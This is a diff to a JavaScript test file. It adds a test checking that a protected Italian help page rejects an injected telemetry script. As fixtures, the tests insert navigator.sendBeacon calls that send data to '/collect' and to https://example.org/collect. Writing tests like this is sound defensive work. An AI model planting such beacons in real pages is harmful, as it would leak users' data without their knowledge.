@@ -153,3 +153,9 @@ test('international help stays pinned and cannot transmit queries through either
     await expectHold(async (root) => mutate(root, file, (source) => `${source}\nnavigator.sendBeacon('/collect', 'sensitive');\n`), /forbidden network request/);
   }
 });
+
+test('Italian help remains protected against telemetry on the new route', async () => {
+  await expectHold(async root => {
+    await mutate(root, 'ayuda/it/index.html', html => html.replace('</body>', '<script>navigator.sendBeacon("https://example.org/collect", "data")</script></body>'));
+  }, /ayuda\/it|protected surface|network|sendBeacon/);
+});
